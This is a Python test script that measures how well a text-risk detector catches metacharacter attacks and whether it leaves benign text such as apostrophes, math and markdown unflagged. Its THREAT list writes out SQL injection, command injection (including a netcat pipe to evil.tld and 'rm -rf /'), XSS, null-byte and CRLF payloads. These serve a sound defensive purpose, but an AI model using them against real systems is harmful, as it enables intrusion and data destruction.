# -*- coding: utf-8 -*-
# SPDX-License-Identifier: LicenseRef-Proprietary
"""
Coverage point #7 — metacharacter attacks, before/after.
  BEFORE = canonicalize -> real MSL (+ supplement + digit cards)
  AFTER  = BEFORE + metachar detector cards
Shows point-7 jump AND that benign apostrophes / math / markdown / tables stay clean.
Run:  MSL_MIP_HOME=/path/to/msl_mip  python range_meta.py
"""
import os, sys
HERE = os.path.dirname(os.path.abspath(__file__))
for _cand in ("canon", "canonicalization"):
    _p = os.path.abspath(os.path.join(HERE, "..", _cand))
    if os.path.isdir(_p):
        sys.path.insert(0, _p); break
sys.path.insert(0, os.path.abspath(os.path.join(HERE, "..", "invariant_engine")))
sys.path.insert(0, HERE)

from canonicalize import canonicalize
from invariant_engine import InvariantEngine, erg
from invariant_engine.msl_real import real_text_reader
from invariant_engine.supplement import supplement_reader, combine
from digit_cards import digit_cards_reader
from metachar_cards import metachar_cards_reader

def _base(c):
    f = real_text_reader(c)
    f = combine(f, supplement_reader(c))
    f = combine(f, digit_cards_reader(c))
    return f

def before_reader(t):
    return _base(canonicalize(t)[0])

def after_reader(t):
    c = canonicalize(t)[0]
    return combine(_base(c), metachar_cards_reader(c))

BEFORE = InvariantEngine(before_reader, erg.no_stream)
AFTER  = InvariantEngine(after_reader,  erg.no_stream)

CASES = [
    # ---- metachar THREATS (pre-pass reveals the sign) ----
    ("THREAT", "sqli quote OR",   "id=1%27 OR %271%27=%271"),
    ("THREAT", "sqli comment",    "user=admin%27--"),
    ("THREAT", "sqli union",      "q=1%27 UNION SELECT password"),
    ("THREAT", "backtick cmd",    "ping %60whoami%60"),
    ("THREAT", "dollar-paren cmd","echo $(%60id%60)"),
    ("THREAT", "pipe nc",         "host %7c nc evil.tld 4444"),
    ("THREAT", "semicolon rm",    "file.txt; rm -rf /"),
    ("THREAT", "xss script",      "%3Cscript%3Ealert(1)%3C%2Fscript%3E"),
    ("THREAT", "xss img onerror", "%3Cimg src=x onerror=alert(1)%3E"),
    ("THREAT", "null byte",       "upload.php%00.jpg"),
    ("THREAT", "crlf header",     "name=x%0d%0aSet-Cookie:evil=1"),
    # ---- BENIGN controls (must stay OK) ----
    ("BENIGN", "apostrophe",      "I don't think it's a big problem"),
    ("BENIGN", "quote legit",     "she said 'hello there' warmly"),
    ("BENIGN", "math lt/gt",      "if a < b and c > d then swap"),
    ("BENIGN", "markdown code",   "call the `print()` function please"),
    ("BENIGN", "table pipe",      "col A | col B | col C header row"),
    ("BENIGN", "boolean or",      "the flag is true|false toggle"),
    ("BENIGN", "multiline",       "line one\nline two\nline three"),
    ("BENIGN", "html mention",    "the <b> tag makes text bold"),
    ("BENIGN", "shell word",      "I love bash scripting and cats"),
]


def run():
    print("POINT #7 — metacharacter cards, before/after")
    print("=" * 72)
    fixed = fp_new = 0
    for kind, name, text in CASES:
        b = BEFORE.analyze(text).risk
        av = AFTER.analyze(text); a = av.risk
        tag = ""
        if kind == "THREAT" and b == "OK" and a != "OK":
            tag = f"  <= CLOSED ({av.finding.signature})"; fixed += 1
        if kind == "BENIGN" and b == "OK" and a != "OK":
            tag = f"  <= NEW false alarm ({av.finding.signature})"; fp_new += 1
        print(f"{kind:6} | {name:16} | before={b:5} after={a:5}{tag}")

    thr = [c for c in CASES if c[0] == "THREAT"]; ben = [c for c in CASES if c[0] == "BENIGN"]
    bc = sum(1 for k,n,t in thr if BEFORE.analyze(t).risk != "OK")
    ac = sum(1 for k,n,t in thr if AFTER.analyze(t).risk != "OK")
    bf = sum(1 for k,n,t in ben if BEFORE.analyze(t).risk != "OK")
    af = sum(1 for k,n,t in ben if AFTER.analyze(t).risk != "OK")
    print("\n" + "=" * 72)
    print(f"metachar threats caught : before {bc}/{len(thr)} ({bc*100//len(thr)}%)"
          f"  ->  after {ac}/{len(thr)} ({ac*100//len(thr)}%)   (+{fixed})")
    print(f"benign kept clean       : before {len(ben)-bf}/{len(ben)}"
          f"  ->  after {len(ben)-af}/{len(ben)}   (new FP: {fp_new})")


if __name__ == "__main__":
    run()
